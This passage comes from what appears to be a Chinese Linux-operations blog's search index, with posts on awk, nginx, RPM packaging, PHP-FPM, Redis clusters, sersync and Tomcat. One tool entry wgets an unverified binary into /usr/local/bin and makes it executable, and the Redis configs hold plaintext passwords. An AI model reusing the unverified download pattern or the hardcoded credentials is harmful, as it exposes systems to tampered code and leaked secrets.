systemd-coredump 999 15 systemd-network 192 $\u003e head -1 passwd |awk 'BEGIN{FS=\":\"}{print $1,$2}' ### root:x:0:0:root:/root:/bin/bash ### root x OFS: 输出分割符，使用OFS变量进行修改 示例: $\u003e awk -F \":\" -v OFS=\"--\" 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12--ftp--14 13--nobody--65534 14--systemd-coredump--999 15--systemd-network--192 其他示例 # 打印范围 $\u003e awk -F: 'NR==12,NR==15{print NR,$1,$3}' pwd.txt 12 ftp 14 13 nobody 65534 14 systemd-coredump 999 15 systemd-network 192 # 自定义变量 awk -v param=n_user 'BEGIN{print \"当前用户: \" param}' 当前用户: n_user $\u003e param=$(whoami) $\u003e echo $param cxd $\u003e awk -v param=$param 'BEGIN{print \"当前用户: \" param}' 当前用户: cxd 3. 域 awk 默认分割符为空格,或者连续的空格,tab默认也为(连续)空格 当awk中只存在条件时,默认输出整行 4. 正则匹配 搜索/etc/passwd中用户主目录在root下的用户名和bash 变量~正则 表示变量值匹配正则表达式 变量!~正则 表示变量值不匹配正则表达式 [root@00 ~]# awk -F: '$(NF-1)~/^\\/root/{print $1,$NF}' /etc/passwd ### root:x:0:0:root:/root:/bin/bash ### ### operator:x:11:0:operator:/root:/sbin/nologin ### root /bin/bash operator /sbin/nologin 5. BEGIN and END BEGIN{变量定义} {判断和计算} END{判读和计算完结执行操作} seq 100 | awk 'BEGIN{sum=0}{sum=$0+sum}END{print sum}' awk 格式化输出 示例: $\u003e awk -F: 'BEGIN{printf \"%-25s\\t%-25s\\t%-25s\\t\\n\",\"用户名\",\"UID\",\"GID\"}NR==2,NR==5{printf \"%-25s\\t%-25s\\t%-25s\\n\",$1,$3,$4}' pwd.txt 用户名 UID GID bin 1 1 daemon 2 2 adm 3 4 lp 4 7 awk 模式 awk ' BEGIN { actions } /pattern/ { actions } /pattern/ { actions } ………. END { actions } ' filenames 6. awk 数组 类似key=value 7. awk 循环 foreach 循环 ","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/:0:0","tags":["linux","awk"],"title":"AWK常用(半草稿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","整理收集"],"content":" 信息 CentOS 7的默认网卡和设备名称都是随机的，根据需要有时候需要修改网卡为以eth开头的。以下整理了两种比较靠谱的。 1. 安装过程中修改 在加载镜像后出现安装选项卡的时候，键盘敲击tab，打开内核启动选项，增加内核参数 net.ifnames=0 biosdevname=0,回车，然后正常安装即可。 2. 安装之后修改 打开并修改/etc/sysconfig/network-scripts/ifcfg-ensxxx中的name和DEVICE修改为eth0,并重命名文件为ifcfg-eth0 修改配置文件/etc/default/grub,在GRUB_CMDLINE_LINUX这个参数后面添加net.ifnames=0 biosdevname=0 ,然后重新重新申城grub配置 grub2-mkconfig -o /boot/grub2/grub.cfg ，重启操作系统即可 ","date":"2022-06-23","objectID":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/:0:0","tags":["linux","解决方案"],"title":"Centos7修改网卡名称","uri":"/posts/linux/centos7%E4%BF%AE%E6%94%B9%E7%BD%91%E5%8D%A1%E5%90%8D%E7%A7%B0/"},{"categories":["linux","运维记事"],"content":"Nginx反向代理jenkins","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/","tags":["linux","jenkins","nginx","解决方案"],"title":"Nginx反向代理jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","运维记事"],"content":"参考文献 : https://wiki.jenkins.io/display/JENKINS/Jenkins+behind+an+NGinX+reverse+proxy 以下为个人解决方案 : jenkins 配置: 添加启动参数 --prefix=/jenkins，docker启动添加环境变量JENKINS_OPTS=\"--prefix=/jenkins\" 前端修改(Jenkins \u003e Manage Jenkins \u003e Jenkins Location \u003e Jenkins URL) 或者修改配置文件/var/jenkins_home/jenkins.model.JenkinsLocationConfiguration.xml中的jenkinsUrl，修改为http(s)://www.example.com/jenkins/,配置文件修改后需重启。 nginx配置: location /jenkins { proxy_pass http://10.0.0.100:8080/; proxy_redirect http:// https://; sendfile off; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_max_temp_file_size 0; # This is the maximum upload size client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 90; proxy_send_timeout 90; proxy_read_timeout 90; proxy_temp_file_write_size 64k; proxy_http_version 1.1; proxy_request_buffering off; proxy_buffering off; } ","date":"2022-06-23","objectID":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/:0:0","tags":["linux","jenkins","nginx","解决方案"],"title":"Nginx反向代理jenkins","uri":"/posts/linux/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86jenkins/"},{"categories":["linux","运维记事"],"content":"常用重定向及解释","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"Linux 标准输出(stdout)和标准错误(stderr)的重定向 1. 重定向符号和语句 \u003e 以擦写的模式重定向至... \u003e\u003e 以追加的模式重定向至... 1 代表stdout标准输出 2 代表stderr标准错误 2. 标准错误重定向到标准输出,然后合并重定向到文件 command 2\u003e\u00261 output.txt 3. 标准输出流将仅重定向到文件，在终端中不可见。如果该文件已存在，则会被覆盖。 command \u003e output.txt #command \u00261\u003e output.txt 4. 标准输出流将仅重定向到文件，在终端中不可见。如果文件已存在，则新数据将附加到文件末尾。 command \u003e\u003e output.txt 5. 标准错误流将仅重定向到文件，在终端中不可见。如果该文件已存在，则会被覆盖。 command 2\u003e output.txt 6. 标准错误流将仅重定向到文件，在终端中不可见。如果文件已存在，则新数据将附加到文件末尾。 command 2\u003e\u003e output.txt 7. 标准输出和标准错误流都将仅重定向到文件，终端中不会显示任何内容。如果该文件已存在，则会被覆盖。 command \u0026\u003e output.txt 8. 标准输出和标准错误流都将仅重定向到文件，终端中不会显示任何内容。如果文件已存在，则新数据将附加到文件末尾。 command \u0026\u003e\u003e output.txt 9. 标准输出流将被复制到文件中，它仍将在终端中可见。如果该文件已存在，则会被覆盖。 command | tee output.txt 10. 标准输出流将被复制到文件中，它仍将在终端中可见。如果文件已存在，则新数据将附加到文件末尾。 command | tee -a output.txt 11. Bash没有简写语法，只允许StdErr管道到第二个命令，这里需要再次与tee组合来完成表格。如果你真的需要这样的东西，请看“如何管道stderr，而不是stdout？” 有关如何通过交换流或使用进程替换来完成此操作的Stack Overflow。 (*) 12. 标准输出和标准错误流都将被复制到文件中，同时仍在终端中可见。如果该文件已存在，则会被覆盖。 command |\u0026 tee output.txt 13. 标准输出和标准错误流都将被复制到文件中，同时仍在终端中可见。如果文件已存在，则新数据将附加到文件末尾。 command |\u0026 tee -a output.txt ","date":"2022-06-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/:0:0","tags":["linux"],"title":"常用重定向及解释","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E5%8F%8A%E8%A7%A3%E9%87%8A/"},{"categories":["linux","运维记事"],"content":"定制rpm包","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","运维记事"],"content":" 本文参照以下引用实践编写 https://www.zyops.com/autodeploy-rpm/ 1. FPM 打包工具 FPM的作者是jordansissel FPM的github： https://github.com/jordansissel/fpm FPM功能简单说就是将一种类型的包转换成另一种类型，其具体工功能实现实际上是对于rpmbuild命令的一个封装 1.1. 支持的源类型包 1. dir 将目录打包成所需要的类型，可以用于源码编译安装的软件包 2. rpm 对rpm进行转换 3. gem 对rubygem包进行转换 4. python 将python模块打包成相应的类型 1.2. 支持的目标类型包 1. rpm 转换为rpm包 2. deb 转换为deb包 3. solaris 转换为solaris包 4. puppet 转换为puppet模块 1.3. FPM安装 # fpm是ruby写的，因此系统环境需要ruby，且ruby版本号大于1.8.5。 # 安装ruby模块 yum -y install ruby rubygems ruby-devel # 查看当前使用的rubygems仓库 gem sources list # 添加阿里云的Rubygems仓库，外国的源慢，移除原生的Ruby仓库 gem sources --add http://mirrors.aliyun.com/rubygems/ --remove http://rubygems.org/ # 安装fpm，gem从rubygem仓库安装软件类似yum从yum仓库安装软件。首先安装低版本的json，高版本的json需要ruby2.0以上，然后安装低版本的fpm，够用。 gem install json -v 1.8.3 gem install fpm -v 1.3.3 # 上面的2步安装仅适合CentOS6系统，CentOS7系统一步搞定，即gem install fpm 1.4. FPM参数 详细使用见fpm –help 常用参数 -s 指定源类型 -t 指定目标类型，即想要制作为什么包 -n 指定包的名字 -v 指定包的版本号 -C 指定打包的相对路径 Change directory to here before searching forfiles -d 指定依赖于哪些包 -f 第二次打包时目录下如果有同名安装包存在，则覆盖它 -p 输出的安装包的目录，不想放在当前目录下就需要指定 --post-install 软件包安装完成之后所要运行的脚本；同--after-install --pre-install 软件包安装完成之前所要运行的脚本；同--before-install --post-uninstall 软件包卸载完成之后所要运行的脚本；同--after-remove --pre-uninstall 软件包卸载完成之前所要运行的脚本；同--before-remove 2. 使用实例–实战定制nginx的RPM包 2.1. 安装nginx 2.2. 定制rpm安装后(前)执行脚本 [root@00 ~]# vim /opt/sh/nginx.rpm.sh #!/bin/bash # 指定但不创建主目录是为了规划ftp虚拟帐号用的 useradd nginx -M -s /sbin/nologin -d /var/ftproot ln -s /opt/nginx-1.14.2/ /opt/nginxssl 2.3. 打包 [root@00 ~]# fpm -s dir -t rpm --description 'nginx' -n nginx -v 1.14.2 -d 'pcre-devel,openssl-devel' --post-install /opt/sh/nginx.rpm.sh -C /opt/nginx-1.6.2/ -f /opt/nginx-1.6.2/ # 安装好的，复制完整结构内容到一个目录，打包那个目录内的内容是一样的效果 # such as: fpm -s dir -t rpm --description \"badvpn binary for fc32, Source: https://github.com/ambrop72/badvpn \" --rpm-summary 'badvpn' --url 'https://tools.0x5c0f.cc' --license '3-clause BSD license' --iteration fc32 -m 0x5c0f --vendor mail@0x5c0f.cc -n badvpn -v '1.999.130-v1.0' -C . # no value for epoch is set, defaulting to nil {:level=\u003e:warn} no value for epoch is set, defaulting to nil {:level=\u003e:warn} Created package {:path=\u003e\"nginx-1.14.2-1.x86_64.rpm\"} [root@oldboy ~]# ll -h nginx-1.14.2-1.x86_64.rpm -rw-r--r-- 1 root root 6.7M Nov 1 10:02 nginx-1.14.2-1.x86_64.rpm ","date":"2022-06-23","objectID":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/:0:0","tags":["linux","fpm","rpm","解决方案"],"title":"定制rpm包","uri":"/posts/linux/%E5%AE%9A%E5%88%B6rpm%E5%8C%85/"},{"categories":["linux","那些有用没用的"],"content":"收集的一些感觉挺好用的工具","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1. 文件内容搜索工具(ag) # 类似于grep $\u003e yum install the_silver_searcher $\u003e ag \"hello\" ./example 2. mysql 命令补全工具，可替代mysql命令 https://github.com/dbcli $\u003e pip install -U mycli $\u003e mycli 3. 多线程下载工具(axel) $\u003e yum install axel $\u003e axel -n 10 http(ftp)://example.com/example.iso 4. 终端命令补全 $\u003e yum install bash-completion -y 5. linux 硬件查看神器 $\u003e yum install inxi -y 6. linux Script 终端记录神器 https://asciinema.org/ $\u003e pip3 install asciinema 7. linux 文件加密与解密工具 https://linux.cn/article-10632-1.html $\u003e wget -O /usr/local/bin/toplip https://2ton.com.au/standalone_binaries/toplip \u0026\u0026 chmod +x /usr/local/bin/toplip 8. zenity - display GTK+ dialogs( 图形界面操纵工具 ) $\u003e zenity --help 9. 系统性能监控和故障诊断工具 sysdig ## fedora 下，新版已经不支持 dkms,使用需要使用 --modern-bpf ## https://github.com/draios/sysdig/issues/2035 # 网络宽带占用 $\u003e sysdig -c topprocs_net # CPU 占用 $\u003e sysdig -c topprocs_cpu # 读写量最大的文件 $\u003e sysdig -c topfiles_bytes # 查看容器相关资源使用状态 $\u003e csysdig -vcontainers 10. 终端文件管理工具，支持文件预览 yazi https://github.com/sxyazi/yazi 11. Linux 下 TCP/UDP 端口转发工具 https://github.com/samhocevar/rinetd 12. Linux 下好用的剪贴板管理工具 copyq $\u003e sudo dnf install -y copyq 13. runlike 显示正在运行的容器 docker run 命令 # alias runlike=\"docker run --rm -v /var/run/docker.sock:/var/run/docker.sock assaflavie/runlike\" $\u003e pip install runlike ","date":"2022-06-23","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:0:0","tags":["linux"],"title":"那些好用的工具收集","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Php运维故障记录","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"1. PHP message: PHP Fatal error: Allowed memory size of 134217728 bytes exhausted, 修改 php.ini # memory_limit = 128M # 默认 # memory_limit = -1 # 代表无限制 memory_limit = 256M # 一个线程的最大内存使用量，即一个Web请求可使用的PHP内存量。 # 完成后重启nginx即可 2. request_terminate_timeout的值如果设置为0或者过长的时间，可能会引起file_get_contents的资源问题。 http://www.cnblogs.com/argb/p/3604340.html 如果file_get_contents请求的远程资源如果反应过慢，file_get_contents就会一直卡在那里不会超时。我们知道php.ini 里面max_execution_time 可以设置 PHP 脚本的最大执行时间，但是，在 php-cgi(php-fpm) 中，该参数不会起效。真正能够控制 PHP 脚本最大执行时间的是 php-fpm.conf 配置文件中的request_terminate_timeout参数。 request_terminate_timeout默认值为 0 秒，也就是说，PHP 脚本会一直执行下去。这样，当所有的 php-cgi 进程都卡在 file_get_contents() 函数时，这台 Nginx+PHP 的 WebServer 已经无法再处理新的 PHP 请求了，Nginx 将给用户返回“502 Bad Gateway”。修改该参数，设置一个 PHP 脚本最大执行时间是必要的，但是，治标不治本。例如改成 30s，如果发生 file_get_contents() 获取网页内容较慢的情况，这就意味着 150 个 php-cgi 进程，每秒钟只能处理 5 个请求，WebServer 同样很难避免”502 Bad Gateway”。解决办法是request_terminate_timeout设置为10s或者一个合理的值，或者给file_get_contents加一个超时参数。 $ctx = stream_context_create(array( 'http' =\u003e array( 'timeout' =\u003e 10 //设置一个超时时间，单位为秒 ) )); file_get_contents($str, 0, $ctx); 3. max_requests参数配置不当，可能会引起间歇性502错误(转) pm.max_requests = 1000 设置每个子进程重生之前服务的请求数. 对于可能存在内存泄漏的第三方模块来说是非常有用的. 如果设置为 ’0′ 则一直接受请求. 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. 默认值: 0. 这段配置的意思是，当一个 PHP-CGI 进程处理的请求数累积到 500 个后，自动重启该进程。 但是为什么要重启进程呢？ 一般在项目中，我们多多少少都会用到一些 PHP 的第三方库，这些第三方库经常存在内存泄漏问题，如果不定期重启 PHP-CGI 进程，势必造成内存使用量不断增长。因此 PHP-FPM 作为 PHP-CGI 的管理器，提供了这么一项监控功能，对请求达到指定次数的 PHP-CGI 进程进行重启，保证内存使用量不增长。 正是因为这个机制，在高并发的站点中，经常导致 502 错误，我猜测原因是 PHP-FPM 对从 NGINX 过来的请求队列没处理好。不过我目前用的还是 PHP 5.3.2，不知道在 PHP 5.3.3 中是否还存在这个问题。 目前我们的解决方法是，把这个值尽量设置大些，尽可能减少 PHP-CGI 重新 SPAWN 的次数，同时也能提高总体性能。在我们自己实际的生产环境中发现，内存泄漏并不明显，因此我们将这个值设置得非常大（204800）。大家要根据自己的实际情况设置这个值，不能盲目地加大。 话说回来，这套机制目的只为保证 PHP-CGI 不过分地占用内存，为何不通过检测内存的方式来处理呢？我非常认同高春辉所说的，通过设置进程的峰值内在占用量来重启 PHP-CGI 进程，会是更好的一个解决方案。 4. php-fpm的慢日志，debug及异常排查神器： request_slowlog_timeout设置一个超时的参数，slowlog设置慢日志的存放位置 tail -f /var/log/www.slow.log 上面的命令即可看到执行过慢的php过程。 大家可以看到经常出现的网络读取超过、Mysql查询过慢的问题，根据提示信息再排查问题就有很明确的方向了。 ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","php","解决方案"],"title":"Php运维故障记录","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Redis集群及redis代理predixy配置","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"1. 测试版本: redis 5.0.9 make PREFIX=/opt/redis-5.0.10 install mkdir -p /opt/redis-5.0.10/{data,logs,etc} 1.1. 配置文件额外修改以下参数(多少个节点，多少个独立配置文件) masterauth 123456 # 与requirepass密码一致 cluster-enabled yes cluster-config-file /data/cacheDB/redis-server/etc/nodes-6370.conf cluster-node-timeout 15000 1.2. 启动 /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6370.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6371.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6372.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6375.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6376.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6377.conf 1.3. 激活集群连接 /data/cacheDB/redis-server/bin/redis-cli \\ --cluster create \\ 192.16.10.200:6371 \\ 192.16.10.200:6372 \\ 192.16.10.200:6373 \\ 192.16.10.201:6375 \\ 192.16.10.201:6376 \\ 192.16.10.201:6377 \\ --cluster-replicas 1 \\ -a 123456 # -cluster-replicas 1 从节点个数，以上为3主3从 1.4. redis 代理(一个服务器上部署，看需要部署多节点) https://juejin.im/post/6863701563685371917 yum install libstdc++-static gcc gcc-c++ -y git clone https://github.com/joyieldInc/predixy.git make MT=true cp -v ./conf/auth.conf /opt/redis-server/conf/auth.conf cp -v ./conf/cluster.conf /opt/redis-server/conf/cluster.conf cp -v ./conf/latency.conf /opt/redis-server/conf/latency.conf cp -v ./conf/predixy.conf /opt/redis-server/conf/predixy.conf cp -v ./src/predixy /opt/redis-server/bin/ ## /opt/redis-server/conf/predixy.conf # 修改指示节点名 Name Predixy_192.16.10.200 # 可以修改端口 Bind 192.16.10.200:6370 # 修改内容 Include try.conf # 为 Include cluster.conf ## /opt/redis-server/conf/auth.conf # 移除所有可写权限 # 设置管理权限密码为redis一致 # ## /opt/redis-server/conf/cluster.conf # 修改或添加内容为 ClusterServerPool { Password i4ZHIJNDYvndeZOh MasterReadPriority 60 StaticSlaveReadPriority 50 DynamicSlaveReadPriority 50 RefreshInterval 1 ServerTimeout 1 ServerFailureLimit 10 ServerRetryTimeout 1 KeepAlive 120 Servers { + 192.16.10.200:6371 + 192.16.10.200:6372 + 192.16.10.200:6373 + 192.16.10.201:6375 + 192.16.10.201:6376 + 192.16.10.201:6377 } } # 启动 /opt/redis-server/bin/predixy /opt/redis-server/conf/predixy.conf # 连接 /opt/redis-server/bin/redis-cli -h 172.16.80.31 -p 6370 ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","redis","解决方案"],"title":"Redis集群及redis代理配置","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Sersync实时同步工具","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","运维记事"],"content":" 简介 一个可以实时同步的工具，但不能单独运行，需要配合rsync使用，相当于inotify+rsync,但是比他们效率更高，基于块复制。 1.1. 程序说明 # 文件下载解压后实际上就只有两个文件 . └── GNU-Linux-x86 ├── confxml.xml └── sersync2 1.2. 下载 # 代码更新地址 https://code.google.com/archive/p/sersync/downloads # 下载 wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/sersync/sersync2.5.4_64bit_binary_stable_final.tar.gz 1.3. 规划目录 mkdir -p /opt/sersync/{bin,logs,etc} cp ./GNU-Linux-x86/confxml.xml /opt/sersync/etc cp ./GNU-Linux-x86/sersync2 /opt/sersync/bin 1.4. 参数说明 1.4.1. 主程序 [root@11 bin]# /opt/sersync/bin/sersync2 -h # 中文帮助文档，很清晰 set the system param execute：echo 50000000 \u003e /proc/sys/fs/inotify/max_user_watches execute：echo 327679 \u003e /proc/sys/fs/inotify/max_queued_events parse the command param _______________________________________________________ 参数-d:启用守护进程模式 参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍 c参数-n: 指定开启守护线程的数量，默认为10个 参数-o:指定配置文件，默认使用confxml.xml文件 参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块 参数-m:单独启用其他模块，使用 -m socket 开启socket模块 参数-m:单独启用其他模块，使用 -m http 开启http模块 不加-m参数，则默认执行同步程序 ________________________________________________________________ 1.4.2. 配置文件 \u003c!-- 就是一个xml文件 --\u003e \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003chead version=\"2.5\"\u003e \u003chost hostip=\"localhost\" port=\"8008\"\u003e\u003c/host\u003e \u003cdebug start=\"false\"/\u003e \u003cfileSystem xfs=\"false\"/\u003e \u003c!-- xfs 文件系统建议开启 --\u003e \u003cfilter start=\"false\"\u003e \u003c!-- start=\"true\" 开启排除文件,默认关闭,不过开启时第一次不能进行初始同步，可能是bug，也可能本身是这么设定的 --\u003e \u003cexclude expression=\"(.*)\\.svn\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)\\.gz\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^info/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^static/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)/core\\.[0-9]+$\"\u003e\u003c/exclude\u003e \u003c/filter\u003e \u003cinotify\u003e \u003cdelete start=\"true\"/\u003e \u003ccreateFolder start=\"true\"/\u003e \u003ccreateFile start=\"true\"/\u003e \u003ccloseWrite start=\"true\"/\u003e \u003cmoveFrom start=\"true\"/\u003e \u003cmoveTo start=\"true\"/\u003e \u003cattrib start=\"false\"/\u003e \u003cmodify start=\"false\"/\u003e \u003c/inotify\u003e \u003csersync\u003e\u003c!-- 实际上就是rsync的命令及相关参数 --\u003e \u003clocalpath watch=\"/data/www\"\u003e \u003c!-- 同步的源,本地同步路径 --\u003e \u003cremote ip=\"172.16.10.11\" name=\"demo\"/\u003e \u003c!-- ip:rsync 服务的ip name:同步的模块(可跟上目录) --\u003e \u003c!--\u003cremote ip=\"192.168.8.39\" name=\"tongbu\"/\u003e--\u003e \u003c!--\u003cremote ip=\"192.168.8.40\" name=\"tongbu\"/\u003e--\u003e \u003c/localpath\u003e \u003crsync\u003e \u003ccommonParams params=\"-avz\"/\u003e \u003cauth start=\"true\" users=\"rsync_backup\" passwordfile=\"/etc/rsync.pas\"/\u003e \u003cuserDefinedPort start=\"false\" port=\"874\"/\u003e\u003c!-- port=874 --\u003e \u003ctimeout start=\"false\" time=\"100\"/\u003e\u003c!-- timeout=100 --\u003e \u003cssh start=\"false\"/\u003e \u003c/rsync\u003e \u003cfailLog path=\"/opt/sersync/logs/rsync_fail_log.sh\" timeToExecute=\"60\"/\u003e\u003c!--default every 60mins execute once--\u003e \u003ccrontab start=\"false\" schedule=\"600\"\u003e\u003c!--600mins--\u003e \u003ccrontabfilter start=\"false\"\u003e \u003cexclude expression=\"*.php\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"info/*\"\u003e\u003c/exclude\u003e \u003c/crontabfilter\u003e \u003c/crontab\u003e \u003cplugin start=\"false\" name=\"command\"/\u003e \u003c/sersync\u003e \u003cplugin name=\"command\"\u003e \u003cparam prefix=\"/bin/sh\" suffix=\"\" ignoreError=\"true\"/\u003e \u003c!--prefix /opt/tongbu/mmm.sh suffix--\u003e \u003cfilter start=\"false\"\u003e \u003cinclude expression=\"(.*)\\.php\"/\u003e \u003cinclude expression=\"(.*)\\.sh\"/\u003e \u003c/filter\u003e \u003c/plugin\u003e \u003cplugin name=\"socket\"\u003e \u003clocalpath watch=\"/opt/tongbu\"\u003e \u003cdeshost ip=\"192.168.138.20\" port=\"8009\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003cplugin name=\"refreshCDN\"\u003e \u003clocalpath watch=\"/data0/htdocs/cms.xoyo.com/site/\"\u003e \u003ccdninfo domainname=\"ccms.chinacache.com\" port=\"80\" username=\"xxxx\" passwd=\"xxxx\"/\u003e \u003csendurl base=\"http://pic.xoyo.com/cms\"/\u003e \u003cregexurl regex=\"false\" match=\"cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003c/head\u003e ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:0:0","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","整理收集"],"content":"Tcp.ip协议概述","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/","tags":["linux","tcp"],"title":"TCP/IP 协议概述","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","整理收集"],"content":" 引用 两张动图-彻底明白TCP的三次握手与四次挥手 ","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/:0:0","tags":["linux","tcp"],"title":"TCP/IP 协议概述","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","运维记事"],"content":"Tomcat安装及优化","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"/etc/profile java export JAVA_HOME=/opt/jdk1.8.0_271 export PATH=$JAVA_HOME/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar tomcat export TOMCAT_HOME=/opt/tomcat-8.5.59 日志 catalina.out 为主要日志文件，会随着时间不断增加 catalina.$(date +\"%Y-%m-%d\").log 为catalina.out的每日切割文件(实际好像不是，tomcat不会自动切割日志) 多实例 多实例就是多个tomcat，然后修改下端口就行了 监控 命令监控 jps -lvm show-busy-java-threads 查询到繁忙的java进程pid后,通过jstack \u003cpid\u003e查询详细信息，然后发送给开发人员即可 zabbix 监控 系统尽量不要使用纯数字作为主机名 tomcat 开启远程监控功能 $\u003e vim +124 /opt/tomcat-8.5.59/bin/catalina.sh # 124 CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote 